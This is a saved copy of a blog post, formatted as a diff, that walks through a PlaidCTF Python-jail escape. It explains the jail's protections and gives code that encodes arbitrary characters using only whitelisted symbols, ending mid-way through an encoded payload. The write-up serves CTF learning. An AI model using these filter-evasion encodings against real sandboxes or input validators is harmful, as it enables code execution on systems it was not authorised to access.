@@ -1,0 +1,1856 @@
+From: <Saved by Blink>
+Snapshot-Content-Location: https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html
+Subject: =?utf-8?Q?A=20python's=20escape=20from=20PlaidCTF=20jail=20=C2=B7=20wapif?=
+ =?utf-8?Q?lapi?=
+Date: Sat, 13 Feb 2021 14:05:53 -0000
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----MultipartBoundary--ILjgn3GondzfuDIOjQfrYqLpj4vcJIA0jfHucfqfRu----"
+
+
+------MultipartBoundary--ILjgn3GondzfuDIOjQfrYqLpj4vcJIA0jfHucfqfRu----
+Content-Type: text/html
+Content-ID: <frame-0889B0E4086FC64EE4CAC3A56584CE8A@mhtml.blink>
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html
+
+<!DOCTYPE html><html lang=3D"en-us"><head><meta http-equiv=3D"Content-Type"=
+ content=3D"text/html; charset=3DUTF-8">
+  <link href=3D"https://gmpg.org/xfn/11" rel=3D"profile">
+  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+ =20
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
+1.0, maximum-scale=3D1">
+
+  <title>
+   =20
+      A python's escape from PlaidCTF jail =C2=B7 wapiflapi
+   =20
+  </title>
+
+ =20
+
+
+  <!-- CSS -->
+  <link rel=3D"stylesheet" href=3D"https://wapiflapi.github.io/assets/css/m=
+ain.css">
+ =20
+
+<link rel=3D"stylesheet" href=3D"https://fonts.googleapis.com/css?family=3D=
+Abril+Fatface">
+
+  <!-- Icons -->
+  <link rel=3D"apple-touch-icon-precomposed" sizes=3D"144x144" href=3D"http=
+s://wapiflapi.github.io/favicon.png">
+<link rel=3D"shortcut icon" href=3D"https://wapiflapi.github.io/favicon.ico=
+">
+
+  <!-- RSS -->
+  <link rel=3D"alternate" type=3D"application/rss+xml" title=3D"RSS" href=
+=3D"https://wapiflapi.github.io/feed.xml">
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class=3D"post">
+
+    <div id=3D"sidebar">
+  <header>
+    <div class=3D"site-title">
+      <a href=3D"https://wapiflapi.github.io/">
+       =20
+          <span class=3D"back-arrow icon"><svg fill=3D"#000000" height=3D"2=
+4" viewBox=3D"0 0 24 24" width=3D"24" xmlns=3D"http://www.w3.org/2000/svg">
+  <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+  <path d=3D"M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z">=
+</path>
+</svg></span>
+       =20
+        wapiflapi
+      </a>
+    </div>
+    <p class=3D"lead">Binary analysis, computer security, exploit writing, =
+CTFs, hacking.</p>
+  </header>
+  <nav id=3D"sidebar-nav-links">
+ =20
+ =20
+
+ =20
+
+ =20
+
+
+ =20
+
+ =20
+   =20
+ =20
+
+ =20
+
+ =20
+
+
+ =20
+
+
+ =20
+
+ =20
+   =20
+ =20
+
+ =20
+
+ =20
+
+
+  <!-- Optional additional links to insert in sidebar nav -->
+</nav>
+
+
+ =20
+
+  <nav id=3D"sidebar-icon-links">
+ =20
+
+  <a id=3D"subscribe-link" class=3D"icon" title=3D"Subscribe" aria-label=3D=
+"Subscribe" href=3D"https://wapiflapi.github.io/feed.xml">
+    <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"24" =
+xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <circle cx=3D"6.18" cy=3D"17.82" r=3D"2.18"></circle>
+    <path d=3D"M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-1=
+5.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.=
+9-9.9-9.9z"></path>
+</svg>
+  </a>
+
+ =20
+ =20
+ =20
+ =20
+
+ =20
+
+ =20
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+
+  <p>
+  =C2=A9 2019.
+  <a href=3D"https://wapiflapi.github.io/LICENSE.md">MIT License.</a>
+</p>
+
+</div>
+
+    <main class=3D"container">
+      <header>
+  <h1 class=3D"post-title">A python's escape from PlaidCTF jail</h1>
+</header>
+<div class=3D"content">
+  <div class=3D"post-meta">
+  <span class=3D"post-date">22 Apr 2013</span>
+  <span class=3D"post-categories">
+   =20
+  </span>
+</div>
+
+
+  <div class=3D"post-body">
+    <p>Python jails are pretty common among CTF challenges. Often a good kn=
+owledge of
+the interpreter=E2=80=99s internals gets you a long way. For the non initia=
+ted it might
+sometimes seem like black magic. PlaidCTF offered a challenging task that
+required the combination of some different techniques and logic.</p>
+
+<p>This time there was a service listening on the remote server, with a pyt=
+hon
+script called for each new connection. We were told we had to get a shell
+because we couldn=E2=80=99t guess where the flag was stored. Another import=
+ant detail
+is that the challenge was running on python2.6.6.</p>
+
+<p>The script was given to us and you can find its code
+<a href=3D"http://www.pnuts.tk/data/plaid2k13/pyjail/pyjail.py-ae426f39b325=
+ed99123f590c8a8bbe224fefb406">here</a>.</p>
+
+<h1 id=3D"overview">Overview</h1>
+
+<p>Basically it sets up a jail, and then executes user input after some res=
+tricting
+checks. I shall present the different protections before explaining how we =
+can
+bypass most of them, and finally escape from this jail.</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"kn">from</span> <span class=3D=
+"nn">sys</span> <span class=3D"kn">import</span> <span class=3D"n">modules<=
+/span>
+<span class=3D"n">modules</span><span class=3D"o">.</span><span class=3D"n"=
+>clear</span><span class=3D"p">()</span>
+<span class=3D"k">del</span> <span class=3D"n">modules</span>
+</code></pre></div></div>
+
+<p><code class=3D"highlighter-rouge">sys.modules</code> is a dictionary tha=
+t contains all the modules which where imported
+since the interpreter started. Clearing the modules breaks a lot of things.=
+ It
+breaks a lot of stuff because often a standard function will check if some
+module is present. But deleting the modules altogether breaks even more cod=
+e,
+because now the check itself raises an exception!</p>
+
+<p>The next step in setting up the jail=E2=80=99s environment is this:</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"n">__builtins__</span><span cl=
+ass=3D"o">.</span><span class=3D"n">__dict__</span><span class=3D"o">.</spa=
+n><span class=3D"n">clear</span><span class=3D"p">()</span>
+<span class=3D"n">__builtins__</span> <span class=3D"o">=3D</span> <span cl=
+ass=3D"bp">None</span>
+</code></pre></div></div>
+
+<p>This is pretty self explanatory. It clears the dictionary python uses to=
+ find
+its builtins and we can=E2=80=99t use them anymore except if we already hav=
+e a reference
+to the builtin we need somewhere else.</p>
+
+<p>There is one protection left, but it doesn=E2=80=99t try to limit what w=
+e can do, it
+only tries to make it harder by filtering out certain characters and imposi=
+ng a
+length limit. Notice that the script calls <code class=3D"highlighter-rouge=
+">_raw_input</code>, which is just backup it
+made of <code class=3D"highlighter-rouge">raw_input</code> before clearing =
+the builtins.</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"n">inp</span> <span class=3D"o=
+">=3D</span> <span class=3D"n">_raw_input</span><span class=3D"p">()</span>
+<span class=3D"n">inp</span> <span class=3D"o">=3D</span> <span class=3D"n"=
+>inp</span><span class=3D"o">.</span><span class=3D"n">split</span><span cl=
+ass=3D"p">()[</span><span class=3D"mi">0</span><span class=3D"p">][:</span>=
+<span class=3D"mi">1900</span><span class=3D"p">]</span>
+<span class=3D"c1">#Dick move: you also have to only use the characters tha=
+t my solution did.
+</span><span class=3D"n">inp</span> <span class=3D"o">=3D</span> <span clas=
+s=3D"n">inp</span><span class=3D"o">.</span><span class=3D"n">translate</sp=
+an><span class=3D"p">(</span><span class=3D"s">""</span><span class=3D"o">.=
+</span><span class=3D"n">join</span><span class=3D"p">(</span><span class=
+=3D"nb">map</span><span class=3D"p">(</span><span class=3D"nb">chr</span><s=
+pan class=3D"p">,</span> <span class=3D"nb">xrange</span><span class=3D"p">=
+(</span><span class=3D"mi">256</span><span class=3D"p">))),</span>
+<span class=3D"s">'"!#$&amp;*+-/0123456789;=3D&gt;?ABCDEFGHIJKLMNOPQRSTUVWX=
+YZ</span><span class=3D"se">\\</span><span class=3D"s">^ab</span><span clas=
+s=3D"err">
+</span><span class=3D"s">cdefghijklmnopqrstuvwxyz|'</span><span class=3D"p"=
+>)</span>
+</code></pre></div></div>
+
+<p>Basically this means our input should be 1900 bytes or less, and should =
+only
+contain characters in the <code class=3D"highlighter-rouge">set([':', '%', =
+"'", '</code>=E2=80=99, =E2=80=98(=E2=80=98, =E2=80=98,=E2=80=99, =E2=80=98=
+)=E2=80=99, =E2=80=98}=E2=80=99, =E2=80=98{=E2=80=98,
+=E2=80=98[=E2=80=99, =E2=80=98.=E2=80=99, =E2=80=98]=E2=80=99, =E2=80=98&lt=
+;=E2=80=99, =E2=80=98_=E2=80=99, =E2=80=98~=E2=80=99])`, the split ensures =
+there can=E2=80=99t be any white-
+spaces. It=E2=80=99s important to note that we are also allowed to use most=
+ of the non
+printable characters if we want to.</p>
+
+<p>After all this we finally get to the interesting part: code execution! W=
+e are
+lucky because it is in two stages, so we have twice the fun :-)</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"k">exec</span> <span class=3D"=
+s">'a=3D'</span> <span class=3D"o">+</span> <span class=3D"n">_eval</span><=
+span class=3D"p">(</span><span class=3D"n">inp</span><span class=3D"p">,</s=
+pan> <span class=3D"p">{})</span> <span class=3D"ow">in</span> <span class=
+=3D"p">{}</span>
+</code></pre></div></div>
+
+<p>Don=E2=80=99t be fooled. The eval is not in the exec. It could be writte=
+n like this:</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"n">cmd</span> <span class=3D"o=
+">=3D</span> <span class=3D"s">'a=3D'</span> <span class=3D"o">+</span> <sp=
+an class=3D"n">_eval</span><span class=3D"p">(</span><span class=3D"n">inp<=
+/span><span class=3D"p">,</span> <span class=3D"p">{})</span>
+<span class=3D"k">exec</span> <span class=3D"n">cmd</span> <span class=3D"o=
+w">in</span> <span class=3D"p">{}</span>
+</code></pre></div></div>
+
+<p>Quick reminder, in python <code class=3D"highlighter-rouge">eval</code> =
+is used to evaluate an expression and returns
+its value whereas <code class=3D"highlighter-rouge">exec</code> is a statem=
+ent that compiles and executes a set of
+statements. In short this means you can execute statements when you are usi=
+ng
+<code class=3D"highlighter-rouge">exec</code> but not when using <code clas=
+s=3D"highlighter-rouge">eval</code>.</p>
+
+<p>The empty dict given to <code class=3D"highlighter-rouge">eval</code> as=
+ its second parameter and the <code class=3D"highlighter-rouge">in {}</code=
+> after the
+<code class=3D"highlighter-rouge">exec</code> both mean the same thing, tha=
+t the code should be evaluated in a new
+empty scope. So we can=E2=80=99t (in theory) pass stuff from the <code clas=
+s=3D"highlighter-rouge">eval</code> to the <code class=3D"highlighter-rouge=
+">exec</code>,
+or interact with the outer-world in any way.</p>
+
+<p>Most of python are just references, and this we can see here again. Thes=
+e
+protections only remove references. The original modules like <code class=
+=3D"highlighter-rouge">os</code>, and the
+builtins are not altered in any way. Our task is quiet clear, we need to fi=
+nd a
+reference to something useful and use it to find the flag on the file
+system. But first we need to find a way of executing code with this little
+characters allowed.</p>
+
+<h1 id=3D"running-code">Running code</h1>
+
+<p>How do we get code running with only characters from <code class=3D"high=
+lighter-rouge">set([':', '%', "'", '</code>=E2=80=99,
+=E2=80=98(=E2=80=98, =E2=80=98,=E2=80=99, =E2=80=98)=E2=80=99, =E2=80=98}=
+=E2=80=99, =E2=80=98{=E2=80=98, =E2=80=98[=E2=80=99, =E2=80=98.=E2=80=99, =
+=E2=80=98]=E2=80=99, =E2=80=98&lt;=E2=80=99, =E2=80=98_=E2=80=99, =E2=80=98=
+~=E2=80=99])`? Answer: It=E2=80=99s python,
+python is fun, let=E2=80=99s have some fun.</p>
+
+<p>We have everything we need to build tuples <code class=3D"highlighter-ro=
+uge">()</code>, lists <code class=3D"highlighter-rouge">[]</code> and dicti=
+onaries
+<code class=3D"highlighter-rouge">{:}</code>.  If it was python 2.7 we coul=
+d also make sets using <code class=3D"highlighter-rouge">{}</code> but sadl=
+y that
+isn=E2=80=99t the case. We can also build strings using <code class=3D"high=
+lighter-rouge">' '</code> and we could use <code class=3D"highlighter-rouge=
+">%</code> to do
+some formatting. The comma will obviously help when building tuples or list=
+s,
+and the dot might be useful to access attributes.</p>
+
+<p>We haven=E2=80=99t talked about <code class=3D"highlighter-rouge">&lt;</=
+code>, <code class=3D"highlighter-rouge">~</code>, <code class=3D"highlight=
+er-rouge">_</code> and <code class=3D"highlighter-rouge">`</code>, yet. <co=
+de class=3D"highlighter-rouge">&lt;</code> and <code class=3D"highlighter-r=
+ouge">~</code> are simple
+operators, we can do less-than comparison and binary-negation. <code class=
+=3D"highlighter-rouge">_</code> would be a
+way to have something valid for a variable identifier, but we do not have <=
+code class=3D"highlighter-rouge">=3D</code> so
+that might not be of much use.</p>
+
+<p>Now, if you are like me and didn=E2=80=99t know <code class=3D"highlight=
+er-rouge">`</code> actually did something in
+python2 you might be surprised! As it turns out <code class=3D"highlighter-=
+rouge">`x`</code> is equivalent to
+<code class=3D"highlighter-rouge">repr(x)</code>!  This means we can produc=
+e strings out of objects.</p>
+
+<p>Some of these symbols can be used for multiple purposes, <code class=3D"=
+highlighter-rouge">%</code> can be used for
+string formatting but also for integer modulo and <code class=3D"highlighte=
+r-rouge">&lt;</code> can be used both for
+comparing to integers and in the form of <code class=3D"highlighter-rouge">=
+&lt;&lt;</code> binary-shifting them to the left</p>
+
+<p>We can see that most of the characters we are allowed to use are pretty =
+useful
+and I dare say it is easier doing python with only those than it would be
+without them!</p>
+
+<p>Remember we have two execution stages, first the <code class=3D"highligh=
+ter-rouge">eval</code>, then the <code class=3D"highlighter-rouge">exec</co=
+de>. The
+<code class=3D"highlighter-rouge">exec</code> executes what the <code class=
+=3D"highlighter-rouge">eval</code> returns. So we should consider the <code=
+ class=3D"highlighter-rouge">eval</code> as a
+decoder. The 1900 character limit is supposed to force you to think a lot a=
+bout
+this, but we bypassed it (as I will explain later), that is why we didn=E2=
+=80=99t put to
+much thought into the encoding scheme.</p>
+
+<p>The first thing to notice is that <code class=3D"highlighter-rouge">[]&l=
+t;[]</code> is <code class=3D"highlighter-rouge">False</code>, which is pre=
+tty
+logical. What is less explainable but serves us well is the fact that <code=
+ class=3D"highlighter-rouge">{}&lt;[]</code>
+evaluates to <code class=3D"highlighter-rouge">True</code>.</p>
+
+<p><code class=3D"highlighter-rouge">True</code> and <code class=3D"highlig=
+hter-rouge">False</code>, when used in arithmetic operations, behave like <=
+code class=3D"highlighter-rouge">1</code> and
+<code class=3D"highlighter-rouge">0</code>. This will be the building block=
+ of our decoder but we still need to find a
+way to actually produce arbitrary strings.</p>
+
+<h2 id=3D"getting-characters">Getting characters</h2>
+
+<p>Let=E2=80=99s start with a generic solution, we will improve on it later=
+. Getting the
+numeric ASCII values of our characters seems doable with <code class=3D"hig=
+hlighter-rouge">True</code>, <code class=3D"highlighter-rouge">False</code>=
+, <code class=3D"highlighter-rouge">~</code>
+and <code class=3D"highlighter-rouge">&lt;&lt;</code>. But we need somethin=
+g like <code class=3D"highlighter-rouge">str()</code> or <code class=3D"hig=
+hlighter-rouge">"%c"</code>. This is where the
+invisible characters come in handy! <code class=3D"highlighter-rouge">"\xcb=
+"</code> for example, it=E2=80=99s not even ascii as
+it is larger than 127, but it is valid in a python string, and we can send =
+it to
+the server.</p>
+
+<p>If we take its representation using <code class=3D"highlighter-rouge">`'=
+_\xcb_'`</code> (In practice we will send a
+byte with the value <code class=3D"highlighter-rouge">0xcb</code> <em>not</=
+em> <code class=3D"highlighter-rouge">'\xcb'</code>), we have a string cont=
+aining a c. We
+also need a <code class=3D"highlighter-rouge">'%'</code>, and we need those=
+ two, and those two only.</p>
+
+<p>We want this: <code class=3D"highlighter-rouge">`'%\xcb'`[1::3]</code> ,=
+ using True and False to build the numbers we
+get:</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"sb">`'%\xcb'`</span><span clas=
+s=3D"p">[{}</span><span class=3D"o">&lt;</span><span class=3D"p">[]::</span=
+><span class=3D"o">~</span><span class=3D"p">(</span><span class=3D"o">~</s=
+pan><span class=3D"p">({}</span><span class=3D"o">&lt;</span><span class=3D=
+"p">[])</span><span class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span>=
+<span class=3D"o">&lt;</span><span class=3D"p">[]))]</span>
+</code></pre></div></div>
+
+<p>There you go! Now provided we can have any number build using the same t=
+rick as
+for the indexes we just have to use the above and <code class=3D"highlighte=
+r-rouge">%(number)</code> to get any
+character we want.</p>
+
+<p>Some optimization is possible for specific characters by finding them in=
+ the
+representations of True, False and the invisible characters. As I am about =
+to
+bypass the length limit I didn=E2=80=99t bother doing this to much.</p>
+
+<h2 id=3D"numbers">Numbers</h2>
+
+<p>This is where I failed during the CTF and what cost me the shame of gett=
+ing
+the flag five minutes after the end. Had I coded something to automate the
+process of getting arbitrary numbers I wouldn=E2=80=99t have missed spaces =
+when I
+finally got a shell. But more on that later. The point is I shall do it rig=
+ht
+now.</p>
+
+<p>If you have ever studied any logic you might have encountered the claim =
+that
+everything could be done with NAND gates. NOT-AND. This is remarkably close=
+ to
+how we shall proceed, except for the fact we shall use multiply-by-two inst=
+ead
+of AND. We won=E2=80=99t use True.</p>
+
+<p>Everything can be done using only <code class=3D"highlighter-rouge">Fals=
+e</code> (0), <code class=3D"highlighter-rouge">~</code> (not), <code class=
+=3D"highlighter-rouge">&lt;&lt;</code> (x2), let me show
+you with an example. We shall go from 42 to 0 using <code class=3D"highligh=
+ter-rouge">~</code> and <code class=3D"highlighter-rouge">/2</code>, then w=
+e can
+revert that process using <code class=3D"highlighter-rouge">~</code> and <c=
+ode class=3D"highlighter-rouge">*2</code>.</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code> <span class=3D"mi">42</span> <span class=3D"=
+c1"># /2
+</span> <span class=3D"mi">21</span> <span class=3D"c1"># ~
+</span><span class=3D"o">-</span><span class=3D"mi">22</span> <span class=
+=3D"c1"># /2
+</span><span class=3D"o">-</span><span class=3D"mi">11</span> <span class=
+=3D"c1"># ~
+</span> <span class=3D"mi">10</span> <span class=3D"c1"># /2
+</span>  <span class=3D"mi">5</span> <span class=3D"c1"># ~
+</span> <span class=3D"o">-</span><span class=3D"mi">6</span> <span class=
+=3D"c1"># /2
+</span> <span class=3D"o">-</span><span class=3D"mi">3</span> <span class=
+=3D"c1"># ~
+</span>  <span class=3D"mi">2</span> <span class=3D"c1"># /2
+</span>  <span class=3D"mi">1</span>
+
+<span class=3D"bp">True</span> <span class=3D"o">=3D</span> <span class=3D"=
+o">~</span><span class=3D"p">(</span><span class=3D"o">~</span><span class=
+=3D"p">(</span><span class=3D"o">~</span><span class=3D"p">(</span><span cl=
+ass=3D"o">~</span><span class=3D"p">(</span><span class=3D"mi">42</span><sp=
+an class=3D"o">/</span><span class=3D"mi">2</span><span class=3D"p">)</span=
+><span class=3D"o">/</span><span class=3D"mi">2</span><span class=3D"p">)</=
+span><span class=3D"o">/</span><span class=3D"mi">2</span><span class=3D"p"=
+>)</span><span class=3D"o">/</span><span class=3D"mi">2</span><span class=
+=3D"p">)</span><span class=3D"o">/</span><span class=3D"mi">2</span><span c=
+lass=3D"o">/</span><span class=3D"mi">2</span>
+</code></pre></div></div>
+
+<p>Basically we divided by two when we could, else we inverted all the bits=
+. The
+nice property of this is that when inverting we are guaranteed to be able t=
+o
+divide by two afterward. So that finally we shall hit 1, 0 or -1.</p>
+
+<p>But wait. Didn=E2=80=99t I say we would not use True, 1? Yes I did, but =
+I lied. We will
+use it because True is obviously shorter than <code class=3D"highlighter-ro=
+uge">~(~False*2)</code>, especially
+considering the fact we will use True anyway to do x2, which in our case is=
+ of
+course <code class=3D"highlighter-rouge">&lt;&lt;({}&lt;[])</code>.</p>
+
+<p>Anyway, the moment we hit 1, 0 or -1 we can just use <code class=3D"high=
+lighter-rouge">True</code>, <code class=3D"highlighter-rouge">False</code> =
+or
+<code class=3D"highlighter-rouge">~False</code>.</p>
+
+<p>So now we can reverse this and we have:</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"mi">42</span> <span class=3D"o=
+">=3D</span> <span class=3D"o">~</span><span class=3D"p">(</span><span clas=
+s=3D"o">~</span><span class=3D"p">(</span><span class=3D"o">~</span><span c=
+lass=3D"p">(</span><span class=3D"o">~</span><span class=3D"p">(</span><spa=
+n class=3D"mi">1</span><span class=3D"o">*</span><span class=3D"mi">2</span=
+><span class=3D"p">)</span><span class=3D"o">*</span><span class=3D"mi">2</=
+span><span class=3D"p">)</span><span class=3D"o">*</span><span class=3D"mi"=
+>2</span><span class=3D"p">)</span><span class=3D"o">*</span><span class=3D=
+"mi">2</span><span class=3D"p">)</span><span class=3D"o">*</span><span clas=
+s=3D"mi">2</span>
+</code></pre></div></div>
+
+<p>Using what we are allowed to:</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"mi">42</span> <span class=3D"o=
+">=3D</span> <span class=3D"o">~</span><span class=3D"p">(</span><span clas=
+s=3D"o">~</span><span class=3D"p">(</span><span class=3D"o">~</span><span c=
+lass=3D"p">(</span><span class=3D"o">~</span><span class=3D"p">(({}</span><=
+span class=3D"o">&lt;</span><span class=3D"p">[])</span><span class=3D"o">&=
+lt;&lt;</span><span class=3D"p">({}</span><span class=3D"o">&lt;</span><spa=
+n class=3D"p">[]))</span><span class=3D"o">&lt;&lt;</span><span class=3D"p"=
+>({}</span><span class=3D"o">&lt;</span><span class=3D"p">[]))</span><span =
+class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span><span class=3D"o">&l=
+t;</span><span class=3D"p">[]))</span><span class=3D"o">&lt;&lt;</span><spa=
+n class=3D"p">({}</span><span class=3D"o">&lt;</span><span class=3D"p">[]))=
+</span><span class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span><span c=
+lass=3D"o">&lt;</span><span class=3D"p">[])</span>
+</code></pre></div></div>
+
+<p>How to not loose a CTF:</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"k">def</span> <span class=3D"n=
+f">brainfuckize</span><span class=3D"p">(</span><span class=3D"n">nb</span>=
+<span class=3D"p">):</span>
+    <span class=3D"k">if</span> <span class=3D"n">nb</span> <span class=3D"=
+ow">in</span> <span class=3D"p">[</span><span class=3D"o">-</span><span cla=
+ss=3D"mi">2</span><span class=3D"p">,</span> <span class=3D"o">-</span><spa=
+n class=3D"mi">1</span><span class=3D"p">,</span> <span class=3D"mi">0</spa=
+n><span class=3D"p">,</span> <span class=3D"mi">1</span><span class=3D"p">]=
+:</span>
+        <span class=3D"k">return</span> <span class=3D"p">[</span><span cla=
+ss=3D"s">"~({}&lt;[])"</span><span class=3D"p">,</span> <span class=3D"s">"=
+~([]&lt;[])"</span><span class=3D"p">,</span>
+		         <span class=3D"s">"([]&lt;[])"</span><span class=3D"p">,</span> =
+ <span class=3D"s">"({}&lt;[])"</span><span class=3D"p">][</span><span clas=
+s=3D"n">nb</span><span class=3D"o">+</span><span class=3D"mi">2</span><span=
+ class=3D"p">]</span>
+
+    <span class=3D"k">if</span> <span class=3D"n">nb</span> <span class=3D"=
+o">%</span> <span class=3D"mi">2</span><span class=3D"p">:</span>
+        <span class=3D"k">return</span> <span class=3D"s">"~</span><span cl=
+ass=3D"si">%</span><span class=3D"s">s"</span> <span class=3D"o">%</span> <=
+span class=3D"n">brainfuckize</span><span class=3D"p">(</span><span class=
+=3D"o">~</span><span class=3D"n">nb</span><span class=3D"p">)</span>
+    <span class=3D"k">else</span><span class=3D"p">:</span>
+        <span class=3D"k">return</span> <span class=3D"s">"(</span><span cl=
+ass=3D"si">%</span><span class=3D"s">s&lt;&lt;({}&lt;[]))"</span> <span cla=
+ss=3D"o">%</span> <span class=3D"n">brainfuckize</span><span class=3D"p">(<=
+/span><span class=3D"n">nb</span><span class=3D"o">/</span><span class=3D"m=
+i">2</span><span class=3D"p">)</span>
+</code></pre></div></div>
+
+<p>I wonder if using % as a modulo might optimize the length of some of the=
+se
+expressions. If you have any thoughts about this feel free to talk to me ab=
+out
+it!</p>
+
+<h2 id=3D"and-in-the-darkness-bind-them"><em>And in the darkness bind them!=
+</em></h2>
+
+<p>Joining is not trivial, but there is a little trick that makes it quite =
+easy.
+If we were building a list of characters the representation of that list wo=
+uld
+contain all those characters (obviously), and the best part is they should =
+be
+equally spaced. A simple slice should be enough to give us the complete str=
+ing.</p>
+
+<pre><code class=3D"language-pycon">&gt;&gt;&gt; `['a', 'b', 'c', 'd']`[2::=
+5]
+'abcd'
+
+&gt;&gt;&gt; `['a', 'b', 'c', 'd']`[(({}&lt;[])&lt;&lt;({}&lt;[]))::~(~(({}=
+&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))]
+'abcd'
+</code></pre>
+
+<p>Since we have the ability to generate arbitrary numbers and single chara=
+cters
+this works well.</p>
+
+<p>However <em>care must be taken</em> because this does not always work. I=
+n particular
+when the representation of a character is composed of more than one charact=
+er,
+such cases include but are not limited to <code class=3D"highlighter-rouge"=
+>\n</code>, <code class=3D"highlighter-rouge">\t</code>, <code class=3D"hig=
+hlighter-rouge">\\</code>, etc=E2=80=A6 Luckily those
+characters are seldom needed, and we won=E2=80=99t use them.</p>
+
+<p>We can now generate almost all the code we want from the <code class=3D"=
+highlighter-rouge">eval()</code> and it will be
+passed to the exec statement!</p>
+
+<p>Before moving on to the next step, let=E2=80=99s enjoy some valid python=
+ code!</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code>    <span class=3D"sb">`[`</span><span class=
+=3D"s">'</span><span class=3D"si">%</span><span class=3D"se">\xcb</span><sp=
+an class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;=
+({}&lt;[]))]%(((~(~(~(~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt=
+;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),=
+`</span><span class=3D"s">'</span><span class=3D"si">%</span><span class=3D=
+"se">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(=
+~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt=
+;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&l=
+t;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span class=3D"si">%</=
+span><span class=3D"se">\xcb</span><span class=3D"s">'</span><span class=3D=
+"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[])&=
+lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
+&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><=
+span class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'=
+</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((=
+(((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&=
+lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span =
+class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'</spa=
+n><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~((=
+~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&=
+lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=
+=3D"s">'</span><span class=3D"si">%</span><span class=3D"se">\xcb</span><sp=
+an class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;=
+({}&lt;[]))]%(~(~((((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt=
+;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),=
+`</span><span class=3D"s">'</span><span class=3D"si">%</span><span class=3D=
+"se">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(=
+~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&=
+lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
+&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span class=3D"si">%=
+</span><span class=3D"se">\xcb</span><span class=3D"s">'</span><span class=
